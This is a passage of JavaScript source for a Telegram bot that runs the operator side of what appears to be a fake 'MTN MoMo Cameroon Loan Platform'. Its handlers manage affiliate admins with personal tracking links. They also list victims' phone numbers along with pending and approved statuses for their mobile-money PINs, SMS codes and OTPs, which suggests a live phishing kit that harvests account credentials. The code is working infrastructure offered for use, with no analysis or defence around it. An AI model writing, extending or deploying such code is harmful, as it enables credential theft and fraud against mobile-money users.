// ==========================================
// 7. TELEGRAM COMMAND & CALLBACK HANDLERS
// ==========================================
function setupCommandHandlers() {
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId) {
            if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                return bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\nYour administrative access has been temporarily suspended.`, { parse_mode: 'Markdown' });
            }

            const admin = await db.getAdmin(adminId);
            const isSuperAdmin = adminId === 'ADMIN001' || admin?.role === 'super_admin';

            let welcomeMessage = `
👋 *Welcome back, ${admin?.name || 'Admin'}!*

*Your Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Standard Admin'}
*Your Personal Link:*
${WEBHOOK_URL}?admin=${adminId}

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information
            `.trim();

            if (isSuperAdmin) {
                welcomeMessage += `

*Admin Management (Super Admin Only):*
/addadmin <Name> | <Email> | <ChatID>
/pauseadmin <adminId> - Pause an admin
/unpauseadmin <adminId> - Unpause an admin
/removeadmin <adminId> - Remove an admin
/admins - List all admins

*Messaging:*
/send <adminId> <message> - Message an admin
/broadcast <message> - Message all admins
                `.trim();
            }

            bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown', disable_web_page_preview: true });
        } else {
            bot.sendMessage(chatId, `
👋 *Welcome to MTN MoMo Cameroon Loan Platform*
Your Chat ID is: \`${chatId}\`
Please provide this ID to your Super Administrator to request access.
            `.trim(), { parse_mode: 'Markdown' });
        }
    });

    bot.onText(/\/mylink/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || !isAdminActive(chatId)) return;
        bot.sendMessage(chatId, `🔗 *Your Personal Link:*\n${WEBHOOK_URL}?admin=${adminId}`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/myinfo/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || !isAdminActive(chatId)) return;
        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `👤 *Admin Profile*\n*Name:* ${admin.name}\n*Email:* ${admin.email}\n*ID:* \`${admin.adminId}\`\n*Role:* ${admin.role}\n*Status:* ${admin.status}`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || !isAdminActive(chatId)) return;

        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *ADMINISTRATIVE STATISTICS*
------------------------------
📋 Total Applications: \`${stats.total}\`
⏳ PIN Pending: \`${stats.pinPending}\`
✅ PIN Approved: \`${stats.pinApproved}\`
⏳ SMS Pending: \`${stats.smsPending}\`
✅ SMS Approved: \`${stats.smsApproved}\`
⏳ OTP Pending: \`${stats.otpPending}\`
🎉 Fully Approved: \`${stats.fullyApproved}\`
        `.trim(), { parse_mode: 'Markdown' });
    });

    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || !isAdminActive(chatId)) return;

        const pendingApps = await db.getPendingApplications(adminId);
        if (pendingApps.length === 0) {
            return bot.sendMessage(chatId, '✅ No pending applications found.');
        }

        let text = `📋 *PENDING APPLICATIONS (${pendingApps.length})*\n\n`;
        pendingApps.slice(0, 10).forEach(app => {
            text += `• Ref: \`${app.id}\`\n  Phone: \`${app.phoneNumber}\`\n  Status: PIN(${app.pinStatus}) SMS(${app.smsStatus}) OTP(${app.otpStatus})\n\n`;
        });
        bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    });

    // --- SUPER ADMIN MANAGEMENT COMMANDS ---

    bot.onText(/\/admins/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') {
            return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');
        }

        const admins = await db.getAllAdmins();
        let text = `👥 *REGISTERED ADMINS (${admins.length})*\n\n`;
        admins.forEach(a => {
            text += `• *${a.name}* (\`${a.adminId}\`)\n  Role: ${a.role} | Status: ${a.status} | ChatID: \`${a.chatId}\`\n\n`;
        });
        bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') {
            return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');
        }

        const parts = match[1].split('|').map(p => p.trim());
        if (parts.length < 3) {
            return bot.sendMessage(chatId, '❌ Format error. Use:\n`/addadmin Name | Email | ChatID`', { parse_mode: 'Markdown' });
        }

        const [name, email, targetChatId] = parts;
        const newAdminId = `ADM-${Math.random().toString(36).slice(2, 7).toUpperCase()}`;

        try {
            await db.saveAdmin({
                adminId: newAdminId,
                name,
                email,
                chatId: targetChatId,
                role: 'admin',
                status: 'active'
            });
            adminChatIds.set(newAdminId, targetChatId);
            bot.sendMessage(chatId, `✅ *Admin Created Successfully!*\nID: \`${newAdminId}\`\nName: ${name}\nChat ID: \`${targetChatId}\``, { parse_mode: 'Markdown' });
        } catch (err) {
            bot.sendMessage(chatId, `❌ Error creating admin: ${err.message}`);
        }
    });

    bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') return;

        const targetAdminId = match[1].trim();
        if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '❌ Cannot pause Super Admin.');

        await db.updateAdminStatus(targetAdminId, 'paused');
        pausedAdmins.add(targetAdminId);
        bot.sendMessage(chatId, `⏸️ Admin \`${targetAdminId}\` has been paused.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') return;

        const targetAdminId = match[1].trim();
        await db.updateAdminStatus(targetAdminId, 'active');
        pausedAdmins.delete(targetAdminId);
        bot.sendMessage(chatId, `▶️ Admin \`${targetAdminId}\` has been unpaused.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') return;

        const targetAdminId = match[1].trim();
        if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '❌ Cannot remove Super Admin.');

        await db.deleteAdmin(targetAdminId);
        adminChatIds.delete(targetAdminId);
        pausedAdmins.delete(targetAdminId);
        bot.sendMessage(chatId, `🗑️ Admin \`${targetAdminId}\` has been removed.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/broadcast (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') return;

        const broadcastMsg = match[1];
        const admins = await db.getAllAdmins();
        let count = 0;

        for (const admin of admins) {
            if (admin.chatId) {
                bot.sendMessage(admin.chatId, `📢 *BROADCAST FROM SUPER ADMIN*\n\n${broadcastMsg}`, { parse_mode: 'Markdown' }).catch(() => {});
                count++;
            }
        }
        bot.sendMessage(chatId, `✅ Broadcast sent to ${count} admins.`);
    });

    bot.onText(/\/send (\S+) (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') return;

        const targetAdminId = match[1];
        const directMsg = match[2];
        const targetAdmin = await db.getAdmin(targetAdminId);

        if (!targetAdmin?.chatId) {
            return bot.sendMessage(chatId, `❌ Admin ID \`${targetAdminId}\` not found or has no Chat ID.`, { parse_mode: 'Markdown' });
        }

        bot.sendMessage(targetAdmin.chatId, `📩 *MESSAGE FROM SUPER ADMIN*\n\n${directMsg}`, { parse_mode: 'Markdown' });
        bot.sendMessage(chatId, `✅ Message sent to \`${targetAdminId}\`.`, { parse_mode: 'Markdown' });
    });
}
